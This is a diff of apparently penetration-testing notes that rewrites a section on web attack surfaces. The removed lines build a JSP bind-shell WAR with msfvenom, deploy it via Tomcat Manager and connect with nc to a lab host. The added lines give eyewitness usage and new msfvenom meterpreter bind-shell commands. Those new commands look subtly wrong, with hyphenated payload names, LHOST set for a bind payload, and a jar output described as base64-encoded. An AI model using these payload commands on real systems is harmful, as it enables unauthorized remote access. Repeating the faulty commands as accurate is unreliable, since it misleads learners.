@@ -119,23 +119,33 @@ using: use auxiliary/scanner/http/http_login , we can scan for vulnerabilities
 ![aux](Images/auxiliary.png)
 
 
-# Web-Based Attack Surfaces
-Web-based attacks exploit vulnerabilities in web applications to gain unauthorized access, steal data, or disrupt services. Common attack types include SQL Injection, XSS, CSRF, File Inclusion, Command Injection, Broken Authentication, Directory Traversal, Security Misconfiguration, Insecure Deserialization, and SSRF. To protect against these attacks, employ secure coding practices, input validation, proper authentication mechanisms, and regularly update and configure your web applications and servers.
+### Web-Based Attack Surfaces
 
-To use eyewitness to take screenshots  of web severs including those running on non-standard HTTP/HTTPS ports, we use the following command:
+Web-based attack surfaces encompass web application interfaces, authentication mechanisms, APIs, and server configurations. These areas can present security risks such as SQL injection or session hijacking. Key security measures include:
 
-eyewitness -f hosts.txt --web --resolve --ports 80,443.8080,8443
+- Input validation
+- Secure session management
+- Keeping software updated
 
-#### Generating Payloads
-To use msfvenom to generate a payload that can trigger TCP bind shell, we use the command line;
+Addressing vulnerabilities in these areas helps protect against exploits and enhances overall web security.
 
-#### msfvenom -p java/jsp_shell_bind_tcp LPORT=4444 -f war -o bind_shell.war
+### Using Eyewitness for Web Server Screenshots
 
-We then deploy the WAR file to the Tomcat server. We can do this by accessing the Tomcat Manager interface and uploading the bind_shell.war file.
-Now we can access the bind shell by connecting to the specified port on the target machine. For example, if you set the port to 4444, you can use netcat to connect:
+To take screenshots of servers, including those on non-standard HTTP/HTTPS ports, use the following bash command:
 
-#### nc 10.10.10.55 4444
+eyewitness -f hosts.txt --web --resolve --ports 80,443,8080,8443
 
+### Generating Payloads with msfvenom
+
+To generate a base64-encoded payload that triggers a TCP bind shell on execution on host 10.10.10.55 (Apache Tomcat), use this command:
+
+msfvenom -p java/meterpreter/bind-tcp LHOST=10.10.10.55 LPORT=4444 -f jar
+
+For a payload that triggers a TCP bind shell on execution on host 10.10.10.30 (Python Server), use this command:
+
+msfvenom -p python/meterpreter/bind-tcp LHOST=10.10.10.30 LPORT=4444 -e base64
+
+These commands will help you create the necessary payloads for your penetration testing tasks.
 ![web_attack-surfaces_1](Images/web_attack-surfaces_1.png)
 
 ![WBAS](Images/WBAS.png)
